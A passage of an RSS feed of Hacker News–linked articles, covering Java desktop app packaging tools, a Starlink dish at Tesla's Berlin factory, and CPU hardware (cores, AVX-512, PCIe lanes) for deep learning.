a native pre-JRE splash screen, and a Java download page in case the appropriate JRE cannot be found.</p> </blockquote> </div> <p>Launch4J is released under the BSD 3-Clause License but has not seen any release since 2017.</p> </div> </div> <ul><li><span><a href="https://github.com/libgdx/packr" target="_blank" rel="noopener">packr</a>:</span></li></ul> <div> <div> <div> <blockquote> <p>Packages your JAR, assets, and a JVM for distribution on Windows, Linux, and macOS, adding a native executable file to make it appear like a native app. Packr is most suitable for GUI applications, such as games made with libGDX.</p> <p>packr is released under the Apache License 2.0.</p> </blockquote> </div> </div> </div> <ul><li><span><a href="https://www.ej-technologies.com/products/install4j/overview.html" target="_blank" rel="noopener">Install4J</a>:</span></li></ul> <div> <blockquote> <p>install4j is a powerful multi-platform Java installer builder that generates native installers and application launchers for Java applications.</p> </blockquote> </div> <p>install4J is a proprietary product.</p> </div> </div> <div> <h2 id="conclusion">Conclusion</h2> <div> <p>In this post, we browsed through several options to distribute our Java desktop applications:</p> <ul><li><span>Open Web Start is an option based on the former Java Web Start. Users need to install the software on their system so they can execute JNLP files. Noteworthy features include auto-updating and offline mode.</span></li><li><span>JDK includes <code>jpackage</code>. It allows you to create installers that wrap both the JAR and a JRE.</span></li><li><span><code>jlink</code> is also included in the JDK. Instead of creating installers, it ‚Ä¶</span></li></ul></div></div></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/6/">https://blog.frankel.ch/state-jvm-desktop-frameworks/6/</a></em></p>]]>
            </description>
            <link>https://blog.frankel.ch/state-jvm-desktop-frameworks/6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135532</guid>
            <pubDate>Sun, 14 Feb 2021 19:45:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla Gigafactory Berlin is now connected with Starlink satellite internet]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135480">thread link</a>) | @CarCooler
<br/>
February 14, 2021 | https://www.teslaoracle.com/2021/02/14/tesla-gigafactory-berlin-starlink-satellites/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2021/02/14/tesla-gigafactory-berlin-starlink-satellites/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-8610">
	
	<!-- .cover-header -->

	<div id="post-inner">

		<div>
        
			<figure data-amp-original-style="margin-bottom:30px;">
            <figcaption data-amp-original-style="border:1px dotted blue; margin:2px 0; text-align:center;">Advertisement</figcaption>
            <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
              
            </amp-ad>
            </figure>
				<!-- .Adsense Ad -->

		
<p>Development and construction work at the Tesla Gigafactory Berlin is progressing at a phenomenal pace (latest video below). Several observers of this massive car manufacturing plant in Brandenburg, Germany have been video documenting the development activities since day 1.</p>



<p>Just last week, a SpaceX Starlink satellite internet dish was spotted at the roof of Giga Berlin for the first time, suggesting Tesla has started using Starlink internet service at the factory. Local Giga Berlin observer Tobias Lindh shared the following photos of the <a href="https://www.teslaoracle.com/tag/starlink/">Starlink</a> receiver dish at <a href="https://www.teslaoracle.com/tag/giga-berlin/">Giga Berlin</a> in a tweet.</p>



<figure></figure>



<div><figure><a href="https://evannex.com/?ref=Iqtidar_TeslaOracle_EVANNEX_Banner" target="_blank" rel="sponsored noopener noreferrer"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI1MCcgd2lkdGg9JzMwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption>‚Äì Sponsored ‚Äì</figcaption></figure></div>



<p>Although one dish receiver cannot cater to the needs of the entire plant, this dish is placed above the temporary containers which are currently used as office space for the developing Gigafactory.</p>



<p><a href="https://www.teslaoracle.com/topic/spacex/">SpaceX</a> is creating a low earth orbit (LEO) constellation of Starship satellites and is constantly launching Falcon 9 missions for the purpose. The Starlink website describes the beta state of this service as follows:</p>



<blockquote><p>Starlink is now delivering initial beta service both domestically and internationally, and will continue expansion to near-global coverage of the populated world in 2021.</p><p>During beta, users can expect to see data speeds vary from 50Mb/s to 150Mb/s and latency from 20ms to 40ms in most locations over the next several months as we enhance the Starlink system. There will also be brief periods of no connectivity at all.</p><p>As we launch more satellites, install more ground stations, and improve our networking software, data speed, latency, and uptime will improve dramatically.</p><cite><a href="https://www.starlink.com/" target="_blank" rel="noreferrer noopener">Source Link</a></cite></blockquote>



<p>Unboxing of the Starlink ‚ÄòDishy Mc Flat Face (<a href="#DishyMcFlatFace" target="_blank" rel="noreferrer noopener nofollow">#DishyMcFlatFace</a>)‚Äô as Elon Musk likes to call it, can be seen in the following video by Tesla/SpaceX influencer Viv as she received her set last month.</p>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<figure></figure>



<p>SpaceX is not only expanding the Starlink constellation but also is upgrading the system along the way. With the satellite launch last month, SpaceX sent the new <a href="https://www.teslaoracle.com/2021/01/25/spacx-record-143-satellites-laser-starlinks/">laser-linked Starlinks to the polar orbit</a>.</p>



<p>It has been cold and snowy days at the Giga Berlin for the last few weeks, in the latest drone video from today, the factory is still covered with snow all around. It‚Äôs a white majestic view worth a look. What‚Äôs more interesting is <a href="https://www.teslaoracle.com/2021/02/02/gigafactory-berlin-filled-graffiti-art-elon-musk/">Elon Musk wants Giga Berlin to be filled with graffiti art</a>.</p>



<p>Stay tuned for constant Tesla updates, follow us on:&nbsp;<br><a href="https://news.google.com/publications/CAAqBwgKMOarmgswgLayAw" target="_blank" rel="noreferrer noopener">Google News</a>&nbsp;|&nbsp;<a href="https://flipboard.com/@TeslaOracle" target="_blank" rel="noreferrer noopener nofollow">Flipboard</a>&nbsp;|&nbsp;<a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener nofollow">RSS (Feedly)</a>.</p>



<figure><div>
<amp-youtube data-videoid="KbNXbw1zn3g" layout="responsive" width="16" height="9" title="Giga Berlin | 2021-02-13 | Cold Days" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://www.youtube.com/watch?v=KbNXbw1zn3g"><amp-img src="https://i.ytimg.com/vi/KbNXbw1zn3g/hqdefault.jpg" layout="fill" object-fit="cover" alt="Giga Berlin | 2021-02-13 | Cold Days" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div></figure>
		<!-- Adsense Matched -->
        <figure>
        <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="9763094783" data-auto-format="mcrspv" data-full-width="" i-amphtml-layout="fixed">
          
        </amp-ad>
        </figure><!-- Adsense Matched End -->
		</div><!-- .entry-content -->
		
		<!-- .post-meta-wrapper -->

		<div>
	<!-- .author-name -->
	<div>
		<p>Iqtidar has been writing about Tesla, Elon Musk, and EVs for more than 3 years on XAutoWorld.com, many of his articles have been republished on CleanTechnica and InsideEVs, maintains a healthy relationship with the Tesla community across the Social Media sphere.</p>
		<p><a href="https://www.teslaoracle.com/author/iqtidarali/" rel="author">
			View Archive 		</a>
	</p></div><!-- .author-description -->
</div><!-- .author-bio -->

	</div><!-- .post-inner -->

	
	<!-- .pagination-single -->

	
		<!-- .comments-wrapper -->

		
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2021/02/14/tesla-gigafactory-berlin-starlink-satellites/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135480</guid>
            <pubDate>Sun, 14 Feb 2021 19:40:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware for Deep Learning. Part 2: CPU ‚Äì By Grigory Sapunov ‚Äì Intento]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135352">thread link</a>) | @ai_ja_nai
<br/>
February 14, 2021 | https://blog.inten.to/cpu-hardware-for-deep-learning-b91f53cb18af | <a href="https://web.archive.org/web/*/https://blog.inten.to/cpu-hardware-for-deep-learning-b91f53cb18af">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://moocaholic.medium.com/?source=post_page-----b91f53cb18af--------------------------------" rel="noopener"><img alt="Grigory Sapunov" src="https://miro.medium.com/fit/c/96/96/1*fTggKeGD_XK_nO-qyW3zLw.jpeg" width="48" height="48"></a></p></div></div></div></div><p id="9cc3">This is a part on CPUs in a series ‚ÄúHardware for Deep Learning‚Äù.</p><p id="5ec7">The contents of the series <a href="https://medium.com/@moocaholic/hardware-for-deep-learning-current-state-and-trends-51c01ebbb6dc" rel="noopener">is here</a>.</p><ul><li id="a152"><a href="https://medium.com/p/b91f53cb18af#cd6d" rel="noopener">x86 Family</a></li><li id="8481">‚Äî <a href="#8b17" rel="noopener">Processors, cores, threads, instructions</a></li><li id="4121">‚Äî <a href="#0ac9" rel="noopener">Libraries, etc</a></li><li id="3021">‚Äî <a href="#2bdf" rel="noopener">PCI Express</a></li><li id="2f79">‚Äî <a href="#754e" rel="noopener">Memory</a></li><li id="64ff">‚Äî <a href="#f06d" rel="noopener">Xeon Phi</a></li><li id="397d"><a href="#f2c2" rel="noopener">ARM</a></li><li id="fa24"><a href="#971f" rel="noopener">POWER9</a></li><li id="dcd8"><a href="#c8c7" rel="noopener">RISC-V</a></li><li id="403f"><a href="#7107" rel="noopener">Others</a></li><li id="51bb"><a href="#4fa3" rel="noopener">Conclusions</a></li><li id="c3af"><a href="#39aa" rel="noopener">Release Notes</a></li></ul><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2176/1*XnssY1prbDV7BdUp6PLRIQ.jpeg" width="1088" height="505" srcset="https://miro.medium.com/max/552/1*XnssY1prbDV7BdUp6PLRIQ.jpeg 276w, https://miro.medium.com/max/1104/1*XnssY1prbDV7BdUp6PLRIQ.jpeg 552w, https://miro.medium.com/max/1280/1*XnssY1prbDV7BdUp6PLRIQ.jpeg 640w, https://miro.medium.com/max/1400/1*XnssY1prbDV7BdUp6PLRIQ.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*XnssY1prbDV7BdUp6PLRIQ.jpeg?q=20"></p></div></div></div></figure><h2 id="8b17">Processors, cores, threads, instructions</h2><p id="5db4"><strong>CPUs are Central Processing Units</strong>, the ordinary processors we got used to. They are typically multi-core even on the desktop market (usually from <strong>2 to 10 cores</strong> in modern Core i3-i9 Intel CPUs, but <strong>up to 18 cores/36 threads </strong>in high-end Intel CPUs like <a href="https://ark.intel.com/products/126699/Intel-Core-i9-7980XE-Extreme-Edition-Processor-24_75M-Cache-up-to-4_20-GHz" rel="noopener">i9‚Äì7980XE</a>, <a href="https://ark.intel.com/content/www/us/en/ark/products/189126/intel-core-i9-9980xe-extreme-edition-processor-24-75m-cache-up-to-4-50-ghz.html" rel="noopener">i9‚Äì9980XE</a> or <a href="https://ark.intel.com/content/www/us/en/ark/products/198017/intel-core-i9-10980xe-extreme-edition-processor-24-75m-cache-3-00-ghz.html" rel="noopener">i9‚Äì10980XE</a>, <strong>and up to 32 cores/64 threads</strong> in <a href="https://www.amd.com/en/products/ryzen-threadripper" rel="noopener">AMD Ryzen Threadripper</a>).</p><p id="4ec7">On the server market there are Intel Xeon/AMD <a href="http://www.zdnet.com/article/amds-epyc-server-chips-beat-intel-xeon-2-socket-performance-at-every-price-point/" rel="noopener">EPYC</a>, usually having more cores (<strong>56 cores/112 threads</strong> in <a href="https://ark.intel.com/content/www/us/en/ark/products/194146/intel-xeon-platinum-9282-processor-77m-cache-2-60-ghz.html" rel="noopener">Intel Xeon Platinum 9282</a> or <strong>64 cores/128 threads</strong> in <a href="https://www.amd.com/en/products/cpu/amd-epyc-7742" rel="noopener">AMD EPYC 7742</a>) and some other useful capabilities (supporting more RAM, multi-processor configurations, ECC, etc).</p><p id="5164"><strong><em>CPUs are NOT the current workhorses for DL</em></strong><em>. </em>GPUs have much more specialized cores (up to 5120 in the latest NVIDIA Volta V100 GPUs), and matrix operations (which is DL is mostly about at the low level) are parallelized much better on GPUs.</p><p id="d778">There are some attempts to use clusters of CPUs for DL (like <a href="https://software.intel.com/en-us/articles/bigdl-distributed-deep-learning-on-apache-spark" rel="noopener">BigDL from Intel</a>), optimizing DL libraries for CPUs (<a href="https://github.com/HazyResearch/CaffeConTroll" rel="noopener">Caffe con Troll</a>) and do other hacks (see ‚Äú<a href="https://research.google.com/pubs/pub37631.html" rel="noopener">Improving the speed of neural networks on CPUs</a>‚Äù), but they do not look very promising right now, and can only be useful if you already have a cluster of machines without GPUs.</p><p id="c9d8">Among interesting results there is a November 2017 paper called ‚Äú<a href="https://arxiv.org/abs/1709.05011" rel="noopener"><em>ImageNet Training in Minutes</em></a>‚Äù finished the 100-epoch ImageNet training with AlexNet in 11 minutes on 1024 CPUs. There is an Intel‚Äôs article ‚Äú<a href="https://software.intel.com/en-us/articles/intel-processors-for-deep-learning-training" rel="noopener">Intel Processors for Deep Learning Training</a>‚Äù exploring the main factors contributing to record-setting speed including 1) The compute and memory capacity of Intel Xeon Scalable processors; 2) Software optimizations in the Intel Math Kernel Library for Deep Neural Networks (Intel MKL-DNN) and in the popular deep learning frameworks; 3) Recent advancements in distributed training algorithms for supervised deep learning workloads.</p><p id="9593">In July 2017, Intel launched the <strong>Intel Xeon Scalable</strong> processor family built on 14nm process technology. The Intel Xeon Scalable processors can support up to <strong>28 physical cores (56 threads) per socket (up to 8 sockets)</strong> at 2.50 GHz processor base frequency and 3.80 GHz max turbo frequency, and six memory channels with up to 1.5 TB of 2,666 MHz DDR4 memory. Recommended Customer Price for <a href="https://ark.intel.com/products/120496/Intel-Xeon-Platinum-8180-Processor-38_5M-Cache-2_50-GHz" rel="noopener">Xeon Platinum 8180</a> Processor (28-core) is near $10009.</p><p id="2633">Intel introduced <a href="https://www.intel.com/content/www/us/en/architecture-and-technology/avx-512-overview.html" rel="noopener"><strong>AVX-512 instructions</strong></a>, available on the latest Xeon Phi (see below) and Skylake-X CPUs, including the Core-X series (excluding the Core i5‚Äì7640X and Core i7‚Äì7740X), as well as the new <a href="https://www.intel.com/content/www/us/en/products/processors/xeon/scalable.html" rel="noopener">Xeon Scalable Processor Family</a> and Xeon D-2100 Embedded Series. See <a href="https://en.wikipedia.org/wiki/AVX-512#CPUs_with_AVX-512" rel="noopener">the list of CPUs with AVX-512 here</a>.</p><p id="c9bc">Intel AVX-512 is a set of new instructions that can accelerate performance for heavy computational workloads including deep learning. Here is a <a href="https://software.intel.com/sites/default/files/managed/db/92/Lower-Numerical-Precision-Deep-Learning-Jan2018.pdf" rel="noopener">January 2018 whitepaper</a> with details on how the 512-bit wide Fused Multiply Add (FMA) core instructions, part of the AVX-512, accelerate deep learning by enabling lower-precision operations (more on lower precision computations in the next part of the series dedicated to GPUs).</p><p id="fcc8"><strong><em>Sep 26, 2019 update: </em></strong><em>Among interesting instructions in the AVX-512 are the new set of Intel AVX-512 instructions called </em><a href="https://en.wikichip.org/wiki/x86/avx512vnni" rel="noopener"><em>Vector Neural Network Instructions (AVX512 VNNI)</em></a><em> designed to accelerate convolutional neural network-based algorithms. There are four instructions for integer multiply-and-add present in the Intel Xeon Scalable CPUs </em><a href="https://en.wikipedia.org/wiki/AVX-512#CPUs_with_AVX-512" rel="noopener"><em>since 2019</em></a><em>.</em></p><p id="ff56"><em>This VNNI feature along with the </em><a href="https://en.wikichip.org/wiki/brain_floating-point_format" rel="noopener"><em>Brain floating-point format</em></a><em> are parts of what Intel is calling </em><a href="https://en.wikichip.org/wiki/intel/dl_boost" rel="noopener"><em>DL Boost</em></a><em> (deep learning boost), a set of technologies designed for inference acceleration.</em></p><p id="49f8"><em>DL Boost is not limited by the Xeon family. This technology will be present in the year 2019+ 10th Gen </em><a href="https://pcper.com/2019/05/intel-ice-lake-gen11-graphics/" rel="noopener"><em>Ice Lake processors</em></a><em>, including </em><a href="https://ark.intel.com/content/www/us/en/ark/products/197120/intel-core-i7-1060g7-processor-8m-cache-up-to-3-80-ghz.html" rel="noopener"><em>Core-i7</em></a><em>, </em><a href="https://ark.intel.com/content/www/us/en/ark/products/197121/intel-core-i5-1030g4-processor-6m-cache-up-to-3-50-ghz.html" rel="noopener"><em>i5</em></a><em>, and even </em><a href="https://ark.intel.com/content/www/us/en/ark/products/197122/intel-core-i3-1000g1-processor-4m-cache-up-to-3-20-ghz.html" rel="noopener"><em>i3</em></a><em>.</em></p><p id="a009"><em>Here is </em><a href="https://www.anandtech.com/show/14466/intel-xeon-cascade-lake-vs-nvidia-turing" rel="noopener"><em>a recent comparison</em></a><em> of an Intel CPU with DL Boost and NVIDIA Turing GPU </em><a href="https://click.linksynergy.com/fs-bin/click?id=n3ELiYcpLgk&amp;offerid=695438.16&amp;type=3&amp;subid=0" rel="noopener"><em>Titan RTX</em></a><em> performed on different AI tasks.</em></p><p id="850d"><a href="https://www.intel.ai/vnni-enables-inference/" rel="noopener"><em>More</em></a><em> technical details on VNNI instructions.</em></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3628/1*0294VyIyQIEic4HstV-38w.png" width="1814" height="1357" srcset="https://miro.medium.com/max/552/1*0294VyIyQIEic4HstV-38w.png 276w, https://miro.medium.com/max/1104/1*0294VyIyQIEic4HstV-38w.png 552w, https://miro.medium.com/max/1280/1*0294VyIyQIEic4HstV-38w.png 640w, https://miro.medium.com/max/1400/1*0294VyIyQIEic4HstV-38w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*0294VyIyQIEic4HstV-38w.png?q=20"></p></div></div></div><figcaption><a href="https://conferences.oreilly.com/artificial-intelligence/ai-ny-2019/public/schedule/detail/75131" rel="noopener"><em>More on Intel DL Boost</em></a><em>.</em></figcaption></figure><p id="3105">AMD supports <a href="https://www.reddit.com/r/Amd/comments/6o1tym/ryzen_and_lack_fo_avx_256512/" rel="noopener">AVX-256</a>, but does not support larger vectors. More details on AMD vector instructions <a href="http://www.agner.org/optimize/blog/read.php?i=838" rel="noopener">here</a> and <a href="https://www.anandtech.com/show/10578/amd-zen-microarchitecture-dual-schedulers-micro-op-cache-memory-hierarchy-revealed" rel="noopener">here</a>.</p><h2 id="0ac9">Libraries, etc</h2><p id="422c">Intel also provides a <a href="https://software.intel.com/en-us/inference-engine-devguide-introduction" rel="noopener">Deep Learning Inference Engine</a>, a part of <a href="https://software.intel.com/en-us/dl-deployment-tool-installguide" rel="noopener">Deep Learning Deployment Toolkit</a>. <a href="https://software.intel.com/en-us/inference-engine-devguide-introduction" rel="noopener">The current version of the Inference Engine supports inference</a> of multiple image classification networks, including AlexNet, GoogLeNet, VGG and ResNet families of networks, fully convolutional networks like FCN8 used for image segmentation, and object detection networks like Faster R-CNN. It seems no RNN supported. The Engine supports Caffe, TensorFlow, MXNet.</p><p id="ea22">The current version of the Inference Engine supports inference on Xeon with AVX2 and AVX512, Core Processors with AVX2, Atom Processors with SSE, Intel HD Graphics, Arria A10 FPGA discrete cards. The Inference Engine can inference models in the FP16 and FP32 format (but support depends on configuration).</p><p id="6a9c">Intel also provides <a href="https://software.intel.com/en-us/articles/boosting-deep-learning-training-inference-performance-on-xeon-and-xeon-phi" rel="noopener">recipes on system-level optimizations</a> (targeting Xeon and Xeon Phi processors) allowing without a single line of code change in the framework, to boost the performance for deep learning training by up to 2X and inference by up to 2.7X on top of the current software optimizations available from TensorFlow and Caffe. <a href="https://ai.intel.com/accelerating-deep-learning-training-inference-system-level-optimizations/" rel="noopener">More popular</a> on it.</p><p id="c915">And here is an Intel presentation from March 2017, called ‚Äú<a href="https://indico.cern.ch/event/595059/contributions/2499304/attachments/1430242/2196659/Intel_and_ML_Talk_HansPabst.pdf" rel="noopener">Intel and ML</a>‚Äù.</p><p id="57d5"><strong><em>Sep 26, 2019 update: </em></strong><em>Intel DL Boost technology can be used with modern DL frameworks for converting a pre-trained FP32 model to a quantized INT8 model. </em><a href="https://www.intel.ai/increasing-ai-performance-intel-dlboost/" rel="noopener"><em>Here</em></a><em> you can find links related to TensorFlow, PyTorch, MXNet and other frameworks.</em></p><p id="5f4f"><strong><em>Jan 19, 2020 update: </em></strong><em>as of the end of 2019 there is a set of libraries for DL on CPU:</em></p><ul><li id="1921"><a href="https://github.com/intel-analytics/BigDL" rel="noopener">BigDL</a>: distributed deep learning library for Apache Spark</li><li id="86ba"><a href="https://intel.github.io/mkl-dnn/" rel="noopener">DNNL 1.2.0</a>, Deep Neural Network Library. The library includes basic building blocks for neural networks optimized for Intel Architecture Processors and Intel Processor Graphics.</li><li id="d3ee"><a href="https://docs.openvinotoolkit.org/" rel="noopener">OpenVINO Toolkit</a> for computer vision based on CNNs.</li><li id="cc1a"><a href="https://github.com/plaidml/plaidml" rel="noopener">PlaidML</a>, advanced and portable tensor compiler for enabling deep learning on laptops, embedded devices, or other devices. <br>Supports Keras, ONNX, and nGraph.</li><li id="5259"><a href="https://github.com/intel/caffe" rel="noopener">Intel Caffe</a> (optimized for Xeon).</li><li id="da0f"><a href="https://github.com/HazyResearch/CaffeConTroll" rel="noopener">Caffe Con Troll</a> (research project, with the latest commit in 2016) seems to be dead.</li><li id="b567"><a href="https://www.intel.ai/increasing-ai-performance-intel-dlboost/" rel="noopener">Intel DL Boost</a> can be used in many popular frameworks:<br>TensorFlow, PyTorch, MXNet, PaddlePaddle, Intel Caffe.</li><li id="adf9"><a href="https://www.ngraph.ai/" rel="noopener">nGraph</a>, an end to end deep learning graph compiler for inference and training with extensive framework and hardware support.</li></ul><p id="141c">Looking wider, graph compilers became the hot topic now, bot in TensorFlow and PyTorch ecosystems. Watch especially for <a href="https://www.tensorflow.org/mlir/overview" rel="noopener">MLIR project</a> from Chris Lattner (the author of LLVM and Swift, now in TensorFlow team).</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2812/0*IYz3kLdtPiczh1VL" width="1406" height="612" srcset="https://miro.medium.com/max/552/0*IYz3kLdtPiczh1VL 276w, https://miro.medium.com/max/1104/0*IYz3kLdtPiczh1VL 552w, https://miro.medium.com/max/1280/0*IYz3kLdtPiczh1VL 640w, https://miro.medium.com/max/1400/0*IYz3kLdtPiczh1VL 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*IYz3kLdtPiczh1VL?q=20"></p></div></div></div><figcaption>Graph compilers in TF ecosystem: wider view</figcaption></figure></div></div></section><section><div><div><p id="871c">Keeping in mind that current DL systems are mostly built using GPUs (see the next section), CPU is still an indispensable part of them, and the requirements to CPU are shifted towards better fit to such systems.</p><p id="dfd1"><strong>Number of cores</strong> is no more the main parameter, but you still need enough #Cores, which is at least as much as #GPUs you have. Among other important characteristics are #PCIe lanes, and memory speed.</p><h2 id="2bdf">PCI Express</h2><p id="eb28">You need to transfer data between CPU host memory and GPU memory. In most x86 systems this is done using PCI Express bus (PCIe).</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*HHZrnomProonnwoo" width="1600" height="900" srcset="https://miro.medium.com/max/552/0*HHZrnomProonnwoo 276w, https://miro.medium.com/max/1104/0*HHZrnomProonnwoo 552w, https://miro.medium.com/max/1280/0*HHZrnomProonnwoo 640w, https://miro.medium.com/max/1400/0*HHZrnomProonnwoo 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*HHZrnomProonnwoo?q=20"></p></div></div></div></figure><p id="3555">There are different revisions of PCIe, v3 is the most common now.</p><p id="8c58"><strong>PCIe v.3</strong> allows for 985 MB/s per 1 lane, so <strong>15.75 GB/s</strong> for x16 links.</p><p id="f74b"><strong>PCIe v.4</strong> is twice faster, so <strong>31.51 GB/s</strong> for x16 (supported in X570 chipset for AMD and Radeon cards)</p><p id="6b68"><strong>PCIe v.5</strong> is twice faster again (spec is released, no products expected before 2020), so <strong>63 GB/s</strong> for x16.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1944/0*qFAEc64BJXumprcM" width="972" height="346" srcset="https://miro.medium.com/max/552/0*qFAEc64BJXumprcM 276w, https://miro.medium.com/max/1104/0*qFAEc64BJXumprcM 552w, https://miro.medium.com/max/1280/0*qFAEc64BJXumprcM 640w, https://miro.medium.com/max/1400/0*qFAEc64BJXumprcM 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*qFAEc64BJXumprcM?q=20"></p></div></div></div><figcaption><a href="https://devblogs.nvidia.com/nvlink-pascal-stacked-memory-feeding-appetite-big-data/" rel="noopener">https://devblogs.nvidia.com/nvlink-pascal-stacked-memory-feeding-appetite-big-data/</a></figcaption></figure><p id="cd21">What about the <strong>number of PCI Express lanes</strong>, the typical GPU card works in <strong>x16</strong> mode, but may work in <strong>x8 </strong>or <strong>x4 </strong>mode as well at lower speed.</p><p id="ffa9">It means that to support several GPU cards at the full speed your processor have to support a proportional number of PCIe lanes. For example, if you are using 2 NVIDIA GTX 1080 Ti cards, both in x16 mode, then your system have to support at least 32 PCIe lanes, better more (because you have the chipset and periphery, like SSD M.2, using PCIe as well).</p><p id="212d">The caveat here is that many Intel processors support less than that number of PCIe lanes (28 for <a href="https://ark.intel.com/products/123767/Intel-Core-i7-7820X-X-series-Processor-11M-Cache-up-to-4_30-GHz" rel="noopener">Core i7‚Äì7820X</a> or even 16 as in the case of <a href="https://ark.intel.com/products/97129/Intel-Core-i7-7700K-Processor-8M-Cache-up-to-4_50-GHz" rel="noopener">Core i7-7700K</a> or <a href="https://ark.intel.com/products/126684/Intel-Core-i7-8700K-Processor-12M-Cache-up-to-4_70-GHz" rel="noopener">i7‚Äì8700K</a> processor). In such a case some of your GPUs work in x8 mode, so decreasing the speed of exchange between system and GPU memory. So, be careful.</p><p id="9f66">A good option here could be an old one Core i7‚Äì6850K processor with 40 PCIe lanes or a new one AMD Ryzen Threadripper with even <a href="https://www.guru3d.com/articles-pages/amd-ryzen-threadripper-1950x-review,4.html" rel="noopener">64 PCIe lanes</a>. Some people prefer Xeons or looking at EPYCs (<a href="https://www.amd.com/en/products/epyc-7000-series" rel="noopener">128 lane</a>s), and they will probably be the main option if you‚Äôll build the system with, say, 4+ GPUs (and a typical ATX motherboard doesn‚Äôt help here as well, but there exist special solutions).</p><p id="2081">As a short summary:</p><ul><li id="7dec">Typical Intel mainstream desktop processor has <strong>16</strong> PCIe lanes (e.g. i7‚Äì7700K, i7‚Äì8700K or even i9‚Äì9900K processor).</li><li id="5e58">High-end desktop (HEDT) processor has 28 to 44 lanes (e.g. i7‚Äì7820X has <strong>28</strong>, rather old i7‚Äì6850K has <strong>40</strong>, i9‚Äì9980XE has <strong>44</strong>, upcoming i9‚Äì10940X and higher will have <strong>48</strong>).</li><li id="b7a8">Xeons have up to <strong>64</strong> lanes (PCIe v.3).</li><li id="be5f">AMD Ryzen Threadripper has <strong>64</strong> PCIe lanes, EPYC has <strong>128</strong> lanes (PCIe v.4)</li><li id="f796"><em>Be careful: Intel sometimes uses ‚Äú</em><a href="https://www.anandtech.com/show/11839/intel-core-i9-7980xe-and-core-i9-7960x-review/4" rel="noopener"><em>Platform PCIe lanes</em></a><em>‚Äù, it is CPU+PCH, but the PCH ones have a shared uplink!</em></li><li id="7d7e">Always check specs at <a href="https://ark.intel.com/" rel="noopener">https://ark.intel.com/</a></li></ul><p id="7f76">More <a href="https://www.microway.com/hpc-tech-tips/common-pci-express-myths-gpu-computing/" rel="noopener">about PCIe lanes</a>.</p><p id="19e6">One number I found regarding x8/x16 modes is that in the case of x16‚Üíx8 switching, ‚Äú<em>performance decrease is much lower than 10% for most tasks/networks.</em>‚Äù [<a href="https://twitter.com/Tim_Dettmers/status/932654049874382848" rel="noopener">source</a>]</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2000/0*f1bVaxPQNSiWv4Gs" width="1000" height="255" srcset="https://miro.medium.com/max/552/0*f1bVaxPQNSiWv4Gs 276w, https://miro.medium.com/max/1104/0*f1bVaxPQNSiWv4Gs 552w, https://miro.medium.com/max/1280/0*f1bVaxPQNSiWv4Gs 640w, https://miro.medium.com/max/1400/0*f1bVaxPQNSiWv4Gs 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*f1bVaxPQNSiWv4Gs?q=20"></p></div></div></div></figure><p id="4ef4">If you find any other comprehensive benchmark regarding x8/x16 modes, let me know.</p><h2 id="754e">Memory</h2><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2354/0*eNRQiSRGux_gGz4j" width="1177" height="843" srcset="https://miro.medium.com/max/552/0*eNRQiSRGux_gGz4j 276w, https://miro.medium.com/max/1104/0*eNRQiSRGux_gGz4j 552w, https://miro.medium.com/max/1280/0*eNRQiSRGux_gGz4j 640w, https://miro.medium.com/max/1400/0*eNRQiSRGux_gGz4j 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*eNRQiSRGux_gGz4j?q=20"></p></div></div></div></figure><p id="ff7d">Another important dimension is a <strong>memory configuration</strong>. It includes both the memory speed 